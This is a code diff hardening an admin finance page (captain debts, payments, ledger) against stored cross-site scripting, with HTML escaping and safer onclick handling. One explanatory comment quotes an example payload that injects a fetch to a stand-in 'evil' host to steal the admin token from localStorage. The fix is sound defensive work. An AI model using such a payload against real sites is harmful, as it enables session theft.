@@ -682,6 +682,12 @@ if (!adminToken || !userObj || userObj.role !== 'admin') window.location.href = 
 const API = (typeof API_URL !== 'undefined') ? API_URL : 'https://wajeezsd.com';
 const H   = () => ({ 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` });
 
+// 🔒 تهريب إلزامي لكل ما يكتبه المستخدم قبل حقنه في innerHTML.
+// أسماء الكباتن وأرقامهم وملاحظات القيود تُكتَب من خارج الإدارة، وهذه الصفحة
+// تحمل adminToken في localStorage — فحقنٌ واحد يعني الاستيلاء على الحساب.
+const esc = window.escapeHtml || ((s) => String(s ?? '').replace(/[&<>"']/g, c =>
+    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])));
+
 let currentFilter  = 'pending';
 let allPayments    = [];
 let financeCity    = 'Khartoum'; // مدينة الإدارة المالية الحالية
@@ -1011,7 +1017,7 @@ async function approvePayment(requestId, btn) {
                 <div style="background:#f0f4f8;padding:14px;border-radius:12px;margin-bottom:16px;">
                     <div style="display:flex;justify-content:space-between;margin-bottom:8px;">
                         <span style="color:#718096;font-size:13px;">الكابتن:</span>
-                        <span style="font-weight:700;">${captain.name || '—'}</span>
+                        <span style="font-weight:700;">${esc(captain.name) || '—'}</span>
                     </div>
                     <div style="display:flex;justify-content:space-between;margin-bottom:8px;">
                         <span style="color:#718096;font-size:13px;">المديونية الحالية:</span>
@@ -1182,10 +1188,10 @@ async function loadBlockedCaptains() {
             return `<tr>
                 <td>
                     <div class="captain-cell">
-                        <div class="captain-avatar">${c.name?.charAt(0) || '؟'}</div>
+                        <div class="captain-avatar">${esc(c.name?.charAt(0)) || '؟'}</div>
                         <div>
-                            <div class="captain-name">${c.name || '—'}</div>
-                            <div class="captain-phone">${c.phone || ''}</div>
+                            <div class="captain-name">${esc(c.name) || '—'}</div>
+                            <div class="captain-phone">${esc(c.phone)}</div>
                         </div>
                     </div>
                 </td>
@@ -1318,6 +1324,10 @@ async function loadIndebtedCaptains() {
         const res = await fetch(`${API}/api/admin/captains`, { headers: H() });
         if (!res.ok) throw new Error('API Error');
         const all = await res.json();
+        // نفس القائمة التي يستعملها منتقي المديونية — نُشاركها بدل الاحتفاظ بنسختين
+        // من نفس النداء. وquickAdjustDebt يقرأ اسم الكابتن منها (لا من وسيط في
+        // الـ HTML)، فلو بقيت فارغة هنا لظهر «الكابتن» بدل الاسم في نافذة التأكيد.
+        allCaptainsList = all;
         // Filter captains with negative balance, sorted by most indebted first
         const indebted = all.filter(c => (c.wallet_balance ?? 0) < 0)
             .sort((a, b) => (a.wallet_balance ?? 0) - (b.wallet_balance ?? 0));
@@ -1344,10 +1354,10 @@ async function loadIndebtedCaptains() {
             return `<tr>
                 <td>
                     <div class="captain-cell">
-                        <div class="captain-avatar">${c.name?.charAt(0) || '؟'}</div>
+                        <div class="captain-avatar">${esc(c.name?.charAt(0)) || '؟'}</div>
                         <div>
-                            <div class="captain-name">${c.name || '—'}</div>
-                            <div class="captain-phone">${c.phone || ''}</div>
+                            <div class="captain-name">${esc(c.name) || '—'}</div>
+                            <div class="captain-phone">${esc(c.phone)}</div>
                         </div>
                     </div>
                 </td>
@@ -1366,10 +1376,15 @@ async function loadIndebtedCaptains() {
                 <td>${statusBadge}</td>
                 <td class="text-center">
                     <div style="display:flex;gap:6px;justify-content:center;flex-wrap:wrap;">
-                        <button class="btn-reject" style="font-size:12px;padding:6px 12px;" onclick="quickAdjustDebt('${c._id}', '${c.name}', ${balance}, 'zero')">
+                        <!-- 🔒 الاسم لا يُمرَّر في الـ HTML: كان يُحقن داخل نصّ جافاسكربت
+                             (onclick="...'${'$'}{c.name}'...") فكابتن يسمّي نفسه
+                             x'); fetch('//evil?t='+localStorage.adminToken); ('
+                             يُنفّذ كوده في متصفح الأدمن ويسرق التوكن. الآن نمرّر
+                             المعرّف فقط، والدالة تقرأ الاسم من allCaptainsList. -->
+                        <button class="btn-reject" style="font-size:12px;padding:6px 12px;" onclick="quickAdjustDebt('${c._id}', ${balance}, 'zero')">
                             <i class="fas fa-times-circle"></i> تصفير
                         </button>
-                        <button class="btn-approve" style="font-size:12px;padding:6px 12px;background:linear-gradient(135deg,#f59e0b,#d97706);box-shadow:0 3px 10px rgba(245,158,11,0.3);" onclick="quickAdjustDebt('${c._id}', '${c.name}', ${balance}, 'partial')">
+                        <button class="btn-approve" style="font-size:12px;padding:6px 12px;background:linear-gradient(135deg,#f59e0b,#d97706);box-shadow:0 3px 10px rgba(245,158,11,0.3);" onclick="quickAdjustDebt('${c._id}', ${balance}, 'partial')">
                             <i class="fas fa-minus-circle"></i> نقص جزء
                         </button>
                     </div>
@@ -1477,11 +1492,14 @@ async function addDebt() {
     await _sendDebtAdjust(captainId, captain?.name || '?', balance, 'add', amount, note);
 }
 
-async function quickAdjustDebt(captainId, captainName, balance, mode) {
+async function quickAdjustDebt(captainId, balance, mode) {
+    // الاسم يُقرأ من البيانات المحمَّلة لا من وسيط في الـ HTML (انظر التعليق عند الزر)
+    const captainName = (allCaptainsList.find(c => c._id === captainId) || {}).name || 'الكابتن';
     let amount = null;
     if (mode === 'partial') {
         const { value: val } = await Swal.fire({
-            title: `نقص جزء من مديونية ${captainName}`,
+            // titleText لا title: الأخير يقبل HTML، والاسم يكتبه المستخدم
+            titleText: `نقص جزء من مديونية ${captainName}`,
             html: `
                 <p style="color:#718096;font-size:13px;margin-bottom:12px;">المديونية الحالية: <strong style="color:#e53e3e;">${Math.abs(balance).toFixed(0)} ج.س</strong></p>
                 <input id="quickDebtInput" type="number" min="1" step="100" placeholder="المبلغ المراد خصمه"
@@ -1521,10 +1539,10 @@ async function _sendDebtAdjust(captainId, captainName, currentBalance, mode, amo
         title: `⚠️ تأكيد: ${label}`,
         html: `
             <div style="text-align:right;direction:rtl;font-size:14px;line-height:2;">
-                <p>الكابتن: <strong>${captainName}</strong></p>
+                <p>الكابتن: <strong>${esc(captainName)}</strong></p>
                 ${balanceHtml}
                 <p>الإجراء: <strong style="color:${confirmColor};">${label}</strong></p>
-                ${note ? `<p style="color:#718096;font-size:12px;">السبب: ${note}</p>` : ''}
+                ${note ? `<p style="color:#718096;font-size:12px;">السبب: ${esc(note)}</p>` : ''}
                 ${mode === 'zero' ? '<p style="color:#718096;font-size:12px;">سيُصفَّر الرصيد كاملاً وسيُرفع الحجب إن وجد.</p>' : ''}
                 ${mode === 'add' ? '<p style="color:#f97316;font-size:12px;">سيتم حجب الكابتن تلقائياً إذا تجاوز الحد الائتماني.</p>' : ''}
             </div>`,
@@ -1616,12 +1634,12 @@ async function loadLedger() {
                 <td><span class="status-badge ${cfg.cls}" style="font-size:11px;"><i class="fas fa-${cfg.icon}"></i> ${cfg.label}</span></td>
                 <td style="font-size:12px;color:var(--muted);">${date}</td>
                 <td>
-                    <div style="font-weight:700;font-size:13px;">${e.captain?.name || '—'}</div>
-                    <div style="font-size:11px;color:var(--muted);">${e.captain?.phone || ''}</div>
+                    <div style="font-weight:700;font-size:13px;">${esc(e.captain?.name) || '—'}</div>
+                    <div style="font-size:11px;color:var(--muted);">${esc(e.captain?.phone)}</div>
                 </td>
                 <td>${cityLbl}</td>
                 <td><strong style="color:${cfg.color};font-size:15px;">${(e.amount || 0).toLocaleString()} ج.س</strong></td>
-                <td style="font-size:12px;color:var(--muted);max-width:200px;">${e.note || '—'}</td>
+                <td style="font-size:12px;color:var(--muted);max-width:200px;">${esc(e.note) || '—'}</td>
             </tr>`;
         }).join('');
     } catch(e) {
